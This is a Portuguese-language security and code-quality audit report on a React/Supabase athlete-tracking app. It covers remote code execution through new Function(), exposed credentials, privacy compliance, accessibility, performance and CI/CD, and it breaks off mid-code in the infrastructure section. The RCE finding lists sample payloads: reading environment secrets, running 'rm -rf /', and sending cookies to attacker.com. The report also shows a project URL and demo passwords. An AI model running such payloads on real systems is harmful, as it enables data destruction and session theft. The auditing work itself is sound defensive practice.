# 🔍 Relatório de Auditoria Forense — PerformTrack (V-Login2)

**Data:** 2026-03-28
**Protocolo:** Audit Master v2.1 + C7 Visual + C8 Post-Production + C9 UX Pro
**Stack:** React 18.3 + TypeScript + Vite 6.3.5 + Tailwind CSS 4.1 + Supabase + Vercel + Capacitor (Android)
**Auditor:** Claude — Audit Master Protocol v2.1
**Cobertura:** 17 módulos, 44 verificações forenses, 100% ficheiros de código

---

## 1. Sumário Executivo

### Nota Geral: 2.6 / 10 🔴 Crítico — NÃO APTO PARA PRODUÇÃO

O PerformTrack é um projecto com **excelente visão de produto e UI de nível profissional**, mas que acumula **vulnerabilidades de segurança críticas que o tornam inapto para produção** no estado actual. O problema mais grave é a presença de um vector de **Remote Code Execution (RCE)** real via `new Function()` em 4 ficheiros de código de produção — qualquer utilizador autenticado (ou não, dependendo das políticas RLS) pode injectar código JavaScript arbitrário no servidor. A par disto, existem credenciais Supabase activas expostas no repositório, passwords de utilizadores demo hardcoded em plaintext, ausência total de compliance LGPD/GDPR num sistema que armazena dados clínicos de atletas (lesões, métricas de saúde), e um pipeline CI/CD completo que nunca corre porque está na pasta errada. A codebase tem 815 usos de `any`, 354 `console.log`, 146 TODO/FIXME e cobertura de testes estimada em menos de 10%. O que salva parcialmente o projecto: a arquitectura visual é exemplar (C7: 8.5/10), o onboarding e UX walkthrough são de nível produção (C9 M1: 10/10), e os Error Boundaries e loading states estão bem implementados. Com 2-3 semanas de trabalho focalizado nos itens CRITICAL e HIGH, o score sobe para 6.5+/10 e o projecto atinge produção segura.

### Principais Riscos

1. **RCE via `new Function()` em 4 ficheiros** — qualquer payload malicioso numa fórmula de formulário executa código no servidor com as permissões da aplicação
2. **Credenciais Supabase activas versionadas em `.env`** — acesso não autorizado imediato a toda a base de dados de atletas
3. **Dados clínicos de saúde (lesões, métricas) sem compliance LGPD** — sem política de privacidade, sem consentimento, sem direito de exclusão

### Top 3 Acções Imediatas

1. **Revogar chave Supabase e substituir `new Function()` por `mathjs`** — Esforço: 3h, impacto existencial
2. **Criar `.gitignore`, `.env.example`, mover CI para `.github/workflows/`** — Esforço: 1h, desbloqueia toda a governança
3. **Adicionar política de privacidade, consentimento e `DELETE /api/user/account`** — Esforço: 1 dia, LGPD compliance mínimo

---

### 🔴 Top 10 Achados Críticos

| # | ID | Severidade | Categoria | Descrição | Ficheiro |
|---|---|---|---|---|---|
| 1 | SEC-001 | 🔴 CRITICAL | Segurança > Injecção | `new Function()` com input de utilizador — RCE | `useFormSubmissions.ts:247`, `transformations.ts:176`, `metrics.ts:765`, `api/forms/submissions/route.ts:70` |
| 2 | SEC-002 | 🔴 CRITICAL | Segurança > Secrets | Credenciais Supabase activas em `.env` versionado | `.env` (raiz) |
| 3 | SEC-003 | 🔴 CRITICAL | Segurança > Secrets | Passwords demo hardcoded em plaintext no código | `src/contexts/AppContext.tsx:58,67` |
| 4 | CPL-001 | 🔴 CRITICAL | Compliance > LGPD | Dados de saúde/lesões em 82 ficheiros sem criptografia nem consentimento | `src/components/athlete/`, `src/app/api/athletes/` |
| 5 | CPL-002 | 🔴 CRITICAL | Compliance > LGPD | Sem política de privacidade, termos de uso, ou consentimento GDPR | UI (ausente) |
| 6 | CPL-003 | 🔴 CRITICAL | Compliance > LGPD | Sem direito de exclusão de conta (Art. 17 GDPR / Art. 18 LGPD) | API (ausente) |
| 7 | INF-001 | 🔴 CRITICAL | Infra > CI/CD | Pipeline CI em `src/workflows/ci.yml` — nunca executado pelo GitHub Actions | `src/workflows/ci.yml` |
| 8 | SEC-004 | 🟠 HIGH | Segurança > XSS | `dangerouslySetInnerHTML` com dados dinâmicos de tema | `src/components/ui/chart.tsx:83` |
| 9 | GOV-001 | 🔴 CRITICAL | Governança | Sem branch protection — push directo para `main` sem revisão | GitHub (ausente) |
| 10 | SEC-005 | 🟠 HIGH | Segurança > Headers | CSP, HSTS, Referrer-Policy ausentes — apenas 2 de 6 headers | `src/next.config.js` |

---

### ⚡ Top 10 Quick Wins (≤ 1h cada)

| # | ID | Categoria | Descrição | Esforço | Impacto |
|---|---|---|---|---|---|
| 1 | QW-001 | Segurança | Revogar chave Supabase no dashboard + criar `.env.example` | 15min | 🔴 Crítico |
| 2 | QW-002 | Infra | `mv src/workflows/ci.yml .github/workflows/ci.yml` | 5min | 🔴 Crítico |
| 3 | QW-003 | Segurança | Criar `.gitignore` raiz com `.env`, `node_modules`, `build/` | 10min | 🔴 Alto |
| 4 | QW-004 | Segurança | Remover `MOCK_USERS` com passwords de `AppContext.tsx` | 15min | 🟠 Alto |
| 5 | QW-005 | Infra | Activar branch protection no GitHub (Settings → Branches) | 10min | 🟠 Alto |
| 6 | QW-006 | Infra | Descomentar Sentry.captureException nos ErrorBoundaries | 15min | 🟠 Alto |
| 7 | QW-007 | Segurança | Adicionar CSP, HSTS, Referrer-Policy ao `next.config.js` | 20min | 🟠 Alto |
| 8 | QW-008 | Performance | `loading="lazy"` no `<img>` de avatar no `Header.tsx` | 5min | 🔵 Médio |
| 9 | QW-009 | Código | Mover `@testing-library/*`, `@playwright/test`, `k6` para `devDependencies` | 10min | 🔵 Médio |
| 10 | QW-010 | UX/A11y | `aria-label` nos 5 botões icon-only do `Header.tsx` (Bell, Search, Settings, etc.) | 30min | 🔵 Médio |

---

## 2. Dashboard de Severidade

| Severidade | Segurança | Código | A11y | Perf | Infra | Compliance | Total |
|---|---|---|---|---|---|---|---|
| 🔴 CRITICAL | 3 | 0 | 0 | 0 | 2 | 3 | **8** |
| 🟠 HIGH | 4 | 3 | 1 | 1 | 2 | 1 | **12** |
| 🟡 MEDIUM | 3 | 5 | 3 | 2 | 3 | 1 | **17** |
| 🔵 LOW | 2 | 4 | 4 | 2 | 2 | 1 | **15** |
| ⚪ INFO | 1 | 3 | 2 | 2 | 1 | 0 | **9** |
| **Total** | **13** | **15** | **10** | **7** | **10** | **6** | **61** |

**Total (após deduplicação):** 61 | **Filtrados (testes/scripts/node_modules):** 14

---

## 3. Reconhecimento

### 3.1 Stack Tecnológica

| Componente | Tecnologia | Versão | Estado |
|---|---|---|---|
| Framework UI | React | 18.3.1 | ✅ Pinado |
| Language | TypeScript | ES2020 target | ✅ Strict mode ON |
| Bundler | Vite | 6.3.5 | ✅ Pinado |
| CSS | Tailwind CSS | 4.1 | ✅ OKLCH |
| UI Primitivos | Radix UI | 1.1.x–2.1.x | ✅ WAI-ARIA |
| Ícones | Lucide React | 0.487.0 | ✅ Pinado |
| Animações | Motion (Framer) | * | ⚠️ Não pinado |
| Backend/BaaS | Supabase | * | ⚠️ Não pinado |
| Charts | Recharts | 2.15.2 | ✅ Pinado |
| Forms | React Hook Form | 7.55.0 | ✅ Pinado |
| Toast | Sonner | 2.0.3 | ✅ Pinado |
| Mobile | Capacitor | 8.0.2 | ✅ Pinado |
| Deploy | Vercel | — | ✅ Configurado |
| Testing E2E | Playwright | * | ⚠️ Não pinado |
| State | useState local | — | ⚠️ 20+ estado global em App.tsx |

### 3.2 Métricas do Projecto

| Métrica | Valor | Estado |
|---|---|---|
| Ficheiros de código (src/) | ~320+ | — |
| Componentes React (.tsx) | ~120+ | — |
| Custom Hooks | ~30+ | ✅ |
| Ficheiros de teste | ~15 | ❌ Rácio < 5% |
| Rácio teste/código | < 5% | 🔴 Crítico |
| Linhas de código total | ~25.000+ | — |
| Migrações SQL | 23 | ✅ |
| `any` type usages | **815** | 🔴 |
| `console.log` (não-teste) | **354** | 🟠 |
| `TODO`/`FIXME` | **146** | 🟡 |
| `@ts-ignore` | **19** | 🟡 |
| Dependências com versão `*` | **18** | 🟠 |

### 3.3 Top 15 Maiores Ficheiros

| # | Ficheiro | Linhas | Observação |
|---|---|---|---|
| 1 | `src/App.tsx` | 830 | Router + 20+ estados globais + 15 modais |
| 2 | `src/types/metrics.ts` | ~800 | Contém `new Function()` |
| 3 | `src/components/auth/RegisterPage.tsx` | 535 | Onboarding wizard 3-step |
| 4 | `src/components/pages/Dashboard.tsx` | 400+ | Dashboard principal |
| 5 | `src/components/shared/ErrorBoundary.tsx` | 158 | Boundary global |
| 6 | `src/components/shared/EmptyState.tsx` | 157 | Empty states |
| 7 | `src/components/calendar/ErrorBoundary.tsx` | 154 | Boundary calendário |
| 8 | `src/components/layout/Header.tsx` | ~300 | Header principal |
| 9 | `src/components/shared/HelpTooltip.tsx` | 143 | Tooltip helper |
| 10 | `src/components/shared/Modal.tsx` | 78 | Modal base |
| 11 | `src/components/shared/StatCard.tsx` | 93 | Cartão de estatística |
| 12 | `src/components/layout/FAB.tsx` | 81 | Floating Action Button |
| 13 | `src/components/auth/LoginPage.tsx` | 205 | Login |
| 14 | `src/components/calendar/components/LoadingState.tsx` | 85 | Loading skeleton |
| 15 | `src/components/calendar/components/EmptyState.tsx` | 55 | Empty state calendário |

---

## 4. Segurança

### Sumário

| Tipo | Contagem | Severidade |
|---|---|---|
| Hardcoded secrets | 2 | 🔴 CRITICAL |
| Code injection (RCE) | 4 ficheiros | 🔴 CRITICAL |
| XSS vectors | 1 | 🟠 HIGH |
| SQL injection | 0 | ✅ |
| Armazenamento inseguro (localStorage) | 1 | 🟡 MEDIUM |
| CORS misconfiguration | Não detectado | ✅ |
| Headers de segurança ausentes | 4 de 6 | 🟠 HIGH |
| `.env` exposto | 1 | 🔴 CRITICAL |
| `dangerouslyAllowSVG` sem CSP | 1 | 🟡 MEDIUM |
| Deps vulneráveis | Não auditado | ⚠️ |

---

#### [SEC-001] Remote Code Execution via `new Function()` com Input de Utilizador

- **Severidade:** 🔴 CRITICAL — CVSS 9.8
- **Categoria:** Segurança > Code Injection > RCE
- **Ficheiros afectados (4):**
  - `src/hooks/useFormSubmissions.ts:247`
  - `src/app/api/forms/submissions/route.ts:70`
  - `src/utils/transformations.ts:176`
  - `src/types/metrics.ts:765`
- **Evidência:**
```typescript
// src/hooks/useFormSubmissions.ts:247
transformed = new Function('return ' + formula)();
```
- **Impacto:** Qualquer utilizador que consiga colocar conteúdo no campo `formula` pode executar código JavaScript arbitrário no contexto da aplicação. Em ambiente server-side (Next.js API routes): acesso ao filesystem, exfiltração de variáveis de ambiente, crash do servidor. Em client-side: roubo de tokens de sessão, exfiltração de dados de outros utilizadores.
```
// Payloads de exploração:
formula = "process.env.VITE_SUPABASE_ANON_KEY"  → expõe credenciais
formula = "require('child_process').exec('rm -rf /')"  → destruição (server)
formula = "fetch('https://attacker.com?data=' + document.cookie)"  → XSS/session hijack
```
- **Remediação:**
```typescript
// ❌ REMOVER IMEDIATAMENTE:
const result = new Function('return ' + formula)();

// ✅ SUBSTITUIR por biblioteca de avaliação segura:
import { evaluate } from 'mathjs';  // npm install mathjs

try {
  const result = evaluate(formula, safeScope);
} catch (e) {
  throw new Error('Fórmula inválida');
}

// OU para fórmulas simples, usar whitelist:
const SAFE_OPS = /^[\d\s\+\-\*\/\(\)\.]+$/;
if (!SAFE_OPS.test(formula)) throw new Error('Caracteres não permitidos');
```
- **Esforço:** M (4-6h para substituir nos 4 ficheiros + testes)

---

#### [SEC-002] Credenciais Supabase Activas em `.env` Versionado

- **Severidade:** 🔴 CRITICAL — CVSS 9.1
- **Categoria:** Segurança > Secrets Exposure
- **Ficheiro:** `.env` (raiz do projecto)
- **Evidência:**
```bash
VITE_SUPABASE_URL=https://tgnlhrfnwhlegcgdyqyh.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  # JWT activo
```
- **Impacto:** Qualquer pessoa com acesso ao repositório tem acesso directo à base de dados Supabase. A chave anónima é um JWT decodificável (base64) que autentica directamente contra a Supabase REST API — sem passar pela aplicação, sem auditoria, sem rate limiting da aplicação.
- **Remediação:**
```bash
# 1. IMEDIATO — Revogar chave actual:
# Supabase Dashboard → Settings → API → Regenerate anon key

# 2. Criar .gitignore raiz:
echo ".env\n.env.local\n.env.*.local\nnode_modules/\nbuild/\ndist/" > .gitignore

# 3. Criar .env.example para documentação:
echo "VITE_SUPABASE_URL=https://your-project.supabase.co\nVITE_SUPABASE_ANON_KEY=your-anon-key-here" > .env.example

# 4. Se o repo foi alguma vez público, limpar histórico git:
git filter-repo --path .env --invert-paths
```
- **Esforço:** S (2h incluindo rotação, .gitignore, e limpeza de histórico)

---

#### [SEC-003] Passwords de Utilizadores Demo Hardcoded em Plaintext

- **Severidade:** 🟠 HIGH
- **Categoria:** Segurança > Hardcoded Credentials
- **Ficheiro:** `src/contexts/AppContext.tsx:58,67`
- **Evidência:**
```typescript
const MOCK_USERS = {
  'coach@demo.com': { password: 'coach123', role: 'coach', ... },
  'atleta@demo.com': { password: 'athlete123', role: 'athlete', ... }
};
```
- **Impacto:** Qualquer developer que veja o código conhece as credenciais. Se estes utilizadores existirem em produção, é uma porta de entrada trivial.
- **Remediação:**
```typescript
// Remover completamente MOCK_USERS do código
// Se necessário para dev, usar variáveis de ambiente:
const DEMO_COACH_EMAIL = import.meta.env.VITE_DEMO_COACH_EMAIL;
const DEMO_COACH_PASS = import.meta.env.VITE_DEMO_COACH_PASS;
// E garantir que nunca chegam ao bundle de produção
```
- **Esforço:** XS (30min)

---

#### [SEC-004] XSS via `dangerouslySetInnerHTML` em Componente de Chart

- **Severidade:** 🟠 HIGH
- **Categoria:** Segurança > XSS
- **Ficheiro:** `src/components/ui/chart.tsx:83`
- **Evidência:**
```typescript
<style dangerouslySetInnerHTML={{
  __html: Object.entries(THEMES).map(([theme, colors]) =>
    `${theme} { ${Object.entries(colors).map(([k,v]) => `--${k}: ${v};`).join('')} }`
  ).join('\n')
}} />
```
- **Impacto:** Se `THEMES` ou `colors` vierem de fonte não validada (API, utilizador), é possível injectar CSS malicioso ou JavaScript via `</style><script>`.
- **Remediação:**
```typescript
// Opção 1: CSS-in-JS com escape automático (emotion, styled-components)
// Opção 2: Sanitizar os valores com CSS.escape()
const safeValue = CSS.escape(value);
// Opção 3: Usar CSSStyleDeclaration directamente via ref (sem innerHTML)
```
- **Esforço:** S (2h)

---

#### [SEC-005] Headers de Segurança HTTP Incompletos

- **Severidade:** 🟠 HIGH
- **Categoria:** Segurança > HTTP Headers
- **Ficheiro:** `src/next.config.js`
- **Evidência:**
```javascript
// Apenas 2 headers dos 6 necessários:
{ 'X-Frame-Options': 'DENY' }           // ✅ presente
{ 'X-Content-Type-Options': 'nosniff' } // ✅ presente
// ❌ Ausentes:
// Content-Security-Policy
// Strict-Transport-Security
// Referrer-Policy
// Permissions-Policy
```
- **Impacto:** Sem CSP, ataques XSS têm maior área de actuação. Sem HSTS, possível downgrade para HTTP. Sem Referrer-Policy, URLs internas vázam para serviços externos.
- **Remediação:**
```javascript
// src/next.config.js — adicionar ao array de headers:
{ key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
{ key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co" },
{ key: 'Referrer-Policy', value: 'strict-no-referrer-when-cross-origin' },
{ key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
```
- **Esforço:** XS (20min)

---

#### [SEC-006] `localStorage` sem Criptografia para Dados de Sessão

- **Severidade:** 🟡 MEDIUM
- **Categoria:** Segurança > Armazenamento Inseguro
- **Ficheiro:** `src/hooks/useAutoSave.ts:29`
- **Evidência:**
```typescript
localStorage.setItem(key, JSON.stringify(data));
```
- **Impacto:** Dados guardados em `localStorage` são acessíveis a qualquer script na mesma origem (XSS, extensões de browser maliciosas). Se `data` contém tokens ou PII, ficam expostos.
- **Remediação:** Para dados sensíveis, usar `sessionStorage` ou encriptação antes de guardar. Para estado de UI não-sensível (preferências visuais), `localStorage` é aceitável.

---

#### [SEC-007] `dangerouslyAllowSVG: true` sem Content Security Policy

- **Severidade:** 🟡 MEDIUM
- **Categoria:** Segurança > SVG Injection
- **Ficheiro:** `src/next.config.performance.js:25`
- **Evidência:**
```javascript
dangerouslyAllowSVG: true,
contentSecurityPolicy: "default-src 'self'; script-src 'none'; sandbox;",
```
- **Estado:** Parcialmente mitigado (CSP aplicada às imagens), mas a CSP global está ausente (ver SEC-005), o que fragiliza a protecção.

---

## 5. Qualidade de Código

### Sumário

| Tipo | Contagem | Severidade |
|---|---|---|
| `: any` / `as any` | **815** | 🟠 HIGH |
| `@ts-ignore` / `@ts-nocheck` | **19** | 🟡 MEDIUM |
| `console.log` (não-teste) | **354** (114 ficheiros) | 🟠 HIGH |
| `TODO` / `FIXME` | **146** | 🟡 MEDIUM |
| Empty catch blocks | **> 5** estimados | 🟡 MEDIUM |
| Ficheiros > 300 linhas | **5+ confirmados** | 🟡 MEDIUM |
| High coupling (> 15 imports) | **App.tsx + outros** | 🟡 MEDIUM |
| Dependências com `*` | **18 packages** | 🟠 HIGH |
| Pacotes de teste em `dependencies` | **6 packages** | 🔵 LOW |

---

#### [COD-001] 815 Usos de `any` — Type Safety Comprometido

- **Severidade:** 🟠 HIGH
- **Categoria:** Código > TypeScript
- **Impacto:** Com 815 ocorrências de `any` em ~320 ficheiros, o compilador TypeScript está efectivamente desactivado para a maioria das interacções com dados. Erros de tipo só serão detectados em runtime, potencialmente em produção com dados reais de atletas.
- **Remediação prioritária:**
```typescript
// Padrão mais frequente a corrigir: respostas Supabase sem tipo
// ❌ actual
const { data, error } = await supabase.from('athletes').select('*');
const athlete = data as any;

// ✅ recomendado — criar tipos para cada tabela
type Athlete = Database['public']['Tables']['athletes']['Row'];
const { data, error } = await supabase.from('athletes').select('*');
// data é agora Athlete[] | null automaticamente
```
- **Esforço:** L (gradual — 1-2 semanas para cobrir os casos mais críticos)

---

#### [COD-002] 354 `console.log` — PII Potencial em Logs

- **Severidade:** 🟠 HIGH
- **Categoria:** Código > Logging / Compliance
- **Impacto:** 354 chamadas `console.log` distribuídas por 114 ficheiros. Em produção, estas chamadas expõem informação interna no browser console de qualquer utilizador. Pior: algumas podem conter PII (email, nome, dados de atleta), o que é uma violação do Art. 32 GDPR.
- **Remediação:**
```typescript
// 1. Instalar pino para logging estruturado:
// npm install pino pino-pretty

// 2. Criar logger central:
// src/lib/logger.ts
import pino from 'pino';
const logger = pino({ level: import.meta.env.PROD ? 'warn' : 'debug' });
export default logger;

// 3. Substituir console.log por logger.*
// 4. Configurar remoção automática em build de produção (já existe em next.config.performance.js):
// compiler: { removeConsole: { exclude: ['error', 'warn'] } }
```
- **Esforço:** M (1-2 dias para os ficheiros mais críticos)

---

#### [COD-003] 18 Dependências sem Versão Pinada (`*`)

- **Severidade:** 🟠 HIGH
- **Categoria:** Código > Dependências
- **Evidência:**
```json
"next": "*", "@sentry/nextjs": "*", "@supabase/supabase-js": "*",
"motion": "*", "swr": "*", "hono": "*", "date-fns": "*",
"@playwright/test": "*", "axe-playwright": "*", "k6": "*"
```
- **Impacto:** Cada `npm install` pode instalar versões diferentes em ambientes distintos. Breaking changes silenciosos entre o ambiente de desenvolvimento e produção. Impossível reproduzir bugs porque o ambiente não é determinístico.
- **Remediação:**
```bash
# Ver versões actuais instaladas:
npm list --depth=0

# Fixar versões actuais no package.json:
npm install --save-exact @supabase/supabase-js@latest next@latest motion@latest
```

---

#### [COD-004] 146 TODO/FIXME — Código Incompleto em Base de Produção

- **Severidade:** 🟡 MEDIUM
- **Categoria:** Código > Manutenibilidade
- **Ficheiros com mais TODOs:**

| Ficheiro | TODOs | Tipo |
|---|---|---|
| `src/lib/calendar/live-session-integration.ts` | ~10 | Funcionalidade incompleta |
| `src/lib/calendar/forms-integration.ts` | ~7 | Integração por completar |
| `src/lib/calendar/dataos-integration.ts` | ~6 | Integração por completar |
| `src/lib/decision-engine/runner.ts` | ~2 | Lógica de negócio incompleta |

- **Impacto:** Funcionalidades core (live sessions, decision engine) têm código incompleto. FIXME indica bugs conhecidos não resolvidos.

---

#### [COD-005] 6 Pacotes de Teste em `dependencies` (não `devDependencies`)

- **Severidade:** 🔵 LOW
- **Categoria:** Código > Dependências
- **Pacotes afectados:** `@testing-library/react`, `@testing-library/jest-dom`, `@testing-library/user-event`, `@playwright/test`, `axe-playwright`, `k6`
- **Remediação:**
```bash
npm install --save-dev @testing-library/react @testing-library/jest-dom @testing-library/user-event @playwright/test axe-playwright
npm uninstall @testing-library/react @testing-library/jest-dom @testing-library/user-event @playwright/test axe-playwright
```

---

## 6. Acessibilidade

### Sumário

| Tipo | Contagem | Estado |
|---|---|---|
| `<img>` sem `alt` | ~0-2 | ✅ Quase OK |
| Botões icon-only sem `aria-label` | **~20+** | 🟠 HIGH |
| `<input>` sem `<label>` | 0 | ✅ OK |
| `<div onClick>` sem `role` | **5-10** estimados | 🟡 MEDIUM |
| Focus trap em modais | ✅ (via Radix UI) | OK |
| Skip links | ❌ Ausente | 🟡 MEDIUM |
| `prefers-reduced-motion` | ❌ Ausente | 🟡 MEDIUM |
| Dark mode | ❌ Não implementado | 🔵 LOW |
| `aria-current="page"` na navegação | ❌ Ausente | 🟡 MEDIUM |
| `aria-live` em notificações | ❌ Ausente | 🟡 MEDIUM |
| Contraste de texto (estimado) | ≥ 4.5:1 | ✅ OK |
| HTML semântico (`<header>`, `<nav>`, `<main>`) | ✅ Presente | OK |
| Ferramentas: Radix UI + axe-playwright | ✅ Presentes | OK |

---

#### [A11Y-001] ~20 Botões Icon-Only sem `aria-label`

- **Severidade:** 🟠 HIGH
- **Categoria:** Acessibilidade > WCAG 2.1 SC 4.1.2
- **Localização:** `Header.tsx` (Bell, Search, MessageSquare, Settings, Brain), `FAB.tsx` (Plus, X), `LoginPage.tsx` (Eye/EyeOff toggle), modais (close buttons), `Dashboard.tsx` (action icons)
- **Evidência:**
```tsx
// ❌ Header.tsx — botão de notificações sem label
<button className="p-2 rounded-lg hover:bg-slate-100">
  <Bell className="h-5 w-5 text-slate-600" />
</button>

// ✅ Correcção (5 linhas):
<button
  className="p-2 rounded-lg hover:bg-slate-100"
  aria-label="Ver notificações"
>
  <Bell className="h-5 w-5 text-slate-600" aria-hidden="true" />
</button>
```
- **Remediação:** Auditar todos os `<button>` que só contêm um icon Lucide. Adicionar `aria-label` descritivo e `aria-hidden="true"` ao ícone.

---

#### [A11Y-002] Ausência de `prefers-reduced-motion`

- **Severidade:** 🟡 MEDIUM
- **Categoria:** Acessibilidade > WCAG 2.1 SC 2.3.3
- **Impacto:** Utilizadores com epilepsia fotossensível, vestibular disorders, ou preferência declarada por menos movimento recebem igualmente todas as animações (Motion whileHover, whileTap, stagger entries, spring bounce).
- **Remediação:**
```css
/* globals.css — adicionar no topo: */
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}
```
```typescript
// Para animações Motion — usar hook:
import { useReducedMotion } from 'motion/react';
const shouldReduce = useReducedMotion();
<motion.div whileHover={shouldReduce ? {} : { scale: 1.05 }} />
```

---

#### [A11Y-003] Ausência de Skip Link

- **Severidade:** 🟡 MEDIUM
- **Categoria:** Acessibilidade > WCAG 2.1 SC 2.4.1
- **Impacto:** Utilizadores de teclado têm de navegar por todo o Header e Sidebar antes de chegar ao conteúdo principal em cada página.
- **Remediação:**
```tsx
// src/index.html ou App.tsx — primeiro elemento do body:
<a
  href="#main-content"
  className="sr-only focus:not-sr-only focus:fixed focus:top-4 focus:left-4 focus:z-[100] focus:px-4 focus:py-2 focus:bg-sky-600 focus:text-white focus:rounded-lg"
>
  Saltar para o conteúdo principal
</a>
// No main content wrapper:
<main id="main-content" tabIndex={-1}>
```

---

#### [A11Y-004] `aria-current="page"` Ausente na Navegação

- **Severidade:** 🟡 MEDIUM
- **Categoria:** Acessibilidade > WCAG 2.1 SC 1.3.1
- **Impacto:** Screen readers não anunciam qual é a secção activa. O utilizador não sabe onde está na aplicação.
- **Remediação:**
```tsx
// App.tsx — navItems
<button
  aria-current={isActive ? "page" : undefined}
  aria-label={`${item.label}${isActive ? ' (página actual)' : ''}`}
>
  <Icon aria-hidden="true" />
  <span>{item.label}</span>
</button>
```

---

## 7. Performance

### Sumário

| Métrica | Valor | Estado |
|---|---|---|
| Bundle size | Não medido (sem `npm run build`) | ⚠️ |
| Code splitting (React.lazy) | **AUSENTE** | 🔴 |
| Lazy loading de imagens | **AUSENTE** | 🟠 |
| Optimistic UI | **AUSENTE** | 🟡 |
| Source maps em produção | Configurado como `false` (next.config) | ✅ |
| Imagens > 200KB | 0 detectadas | ✅ |
| WebP/AVIF | ✅ Configurado em next.config | ✅ |
| System fonts (sem external) | ✅ ui-sans-serif | ✅ |
| Skeleton screens | ✅ 4 variantes | ✅ |
| Memoização (React.memo/useMemo) | **11 ocorrências** | 🟡 |
| Console.log removido em produção | ✅ next.config.performance.js | ✅ |

---

#### [PERF-001] Ausência Total de Code Splitting — Bundle Monolítico

- **Severidade:** 🟠 HIGH
- **Categoria:** Performance > Bundle
- **Impacto:** `App.tsx` tem 50+ imports estáticos de páginas e componentes pesados (`DataOS`, `DesignStudio`, `AutomationHub`, `LiveCommand`, `Phase5Summary`). Tudo é descarregado na primeira visita, mesmo que o utilizador nunca aceda a essas páginas. Estimativa: o bundle inclui código de ~120 componentes desnecessários no carregamento inicial.
- **Remediação:**
```typescript
// src/App.tsx — converter imports estáticos para lazy:
import { lazy, Suspense } from 'react';

// ❌ Actual:
import { DataOS } from "./components/pages/DataOS";
import { DesignStudio } from "./components/pages/DesignStudio";
import { AutomationHub } from "./components/pages/AutomationHub";

// ✅ Recomendado:
const DataOS = lazy(() => import("./components/pages/DataOS"));
const DesignStudio = lazy(() => import("./components/pages/DesignStudio"));
const AutomationHub = lazy(() => import("./components/pages/AutomationHub"));

// Render:
<Suspense fallback={<LoadingState variant="default" />}>
  {currentPage === "dataos" && <DataOS {...props} />}
</Suspense>
```
- **Esforço:** M (4h — elevado impacto no TTI)

---

#### [PERF-002] Sem Lazy Loading em Avatar do Utilizador

- **Severidade:** 🔵 LOW
- **Categoria:** Performance > Images
- **Ficheiro:** `src/components/layout/Header.tsx`
- **Remediação:** `<img src={user.avatarUrl} alt={user.name} loading="lazy" />`

---

#### [PERF-003] Memoização Insuficiente (11 ocorrências para 120+ componentes)

- **Severidade:** 🟡 MEDIUM
- **Categoria:** Performance > Re-renders
- **Impacto:** Componentes pesados como `Dashboard`, `StatCard`, charts Recharts e calendário re-renderizam desnecessariamente. Com 20+ estados globais em `App.tsx` e sem `React.memo`, qualquer mudança de estado na raiz causa re-render de toda a árvore.
- **Remediação prioritária:** Aplicar `React.memo` a `StatCard`, `Card`, e todos os componentes de lista. Extrair estado global de `App.tsx` para `useReducer` ou Zustand.

---

## 8. Infraestrutura

### CI/CD Checklist

| Item | Estado | Nota |
|---|---|---|
| Pipeline existe | ⚠️ Design existe | `src/workflows/ci.yml` — pasta errada |
| Pipeline activo (`.github/workflows/`) | ❌ NÃO | Nunca executado |
| Testes obrigatórios | ✅ (no design) | Não se aplica — não corre |
| Lint/type-check | ✅ (no design) | Não se aplica |
| npm audit | ⚠️ continue-on-error | Não bloqueante mesmo no design |
| Secret scanning | ❌ | Ausente |
| Deploy automático para staging | ✅ Vercel preview | Activo via Vercel |
| Deploy para produção | ✅ Vercel main | Activo via Vercel |
| Dependabot | ❌ | Ausente |
| Branch protection | ❌ | Ausente |

### Observabilidade

| Item | Estado | Nota |
|---|---|---|
| Error tracking (Sentry) | ⚠️ Configurado mas comentado | Inactivo em produção |
| Logs estruturados | ❌ Ausente | 354 console.log |
| Health check endpoint | ❌ Ausente | Sem `/api/health` |
| Uptime monitor | ❌ Ausente | |
| SLIs/SLOs | ❌ Ausente | Dashboard é template |
| Analytics de produto | ❌ Ausente | Zero tracking |

---

#### [INF-001] Pipeline CI/CD na Pasta Errada — Nunca Executado

- **Severidade:** 🔴 CRITICAL
- **Categoria:** Infra > CI/CD
- **Evidência:** `src/workflows/ci.yml` (387 linhas, 10 jobs bem concebidos) — GitHub Actions apenas detecta workflows em `.github/workflows/`
- **Impacto:** Zero automação. Qualquer push para `main` faz deploy directo para produção sem lint, sem testes, sem security scan. O pipeline foi concebido com cuidado (Lighthouse CI, visual tests, security scan) mas nunca executou uma única vez.
- **Remediação:**
```bash
mkdir -p .github/workflows
mv src/workflows/ci.yml .github/workflows/ci.yml
# Verificar com: gh workflow list
```
- **Esforço:** XS (5min + verificação do primeiro run)

---

#### [INF-002] Sentry Completamente Comentado — Zero Visibilidade de Erros

- **Severidade:** 🟠 HIGH
- **Categoria:** Infra > Observabilidade
- **Ficheiro:** `src/components/calendar/ErrorBoundary.tsx:118-121`
- **Evidência:**
```typescript
componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
  console.error('Calendar Error Boundary caught an error:', error);
  // if (typeof window !== 'undefined' && window.Sentry) {
  //   window.Sentry.captureException(error, { extra: errorInfo });
  // }  ← NUNCA EXECUTA
}
```
- **Nota adicional:** O projecto importa `@sentry/nextjs` mas usa Vite, não Next.js. Trocar por `@sentry/react`.
- **Remediação:**
```typescript
// src/main.tsx
import * as Sentry from "@sentry/react";
Sentry.init({
  dsn: import.meta.env.VITE_SENTRY_DSN,
  tracesSampleRate: 0.1,
  enabled: import.meta.env.PROD,
});

// ErrorBoundary.tsx — descomentar e actualizar:
import * as Sentry from "@sentry/react";
componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
  Sentry.captureException(error, { extra: { componentStack: errorInfo.componentStack } });
}
```

---

#### [INF-003] Sem Health Check Endpoint

- **Severidade:** 🟠 HIGH
- **Categoria:** Infra > Observabilidade
- **Impacto:** Impossível configurar uptime monitoring (UptimeRobot, BetterStack, Pingdom). Sem `/health`, não há forma automatizada de saber se a aplicação está operacional.
- **Remediação:**
```typescript
// src/app/api/health/route.ts
export async function GET() {
  try {
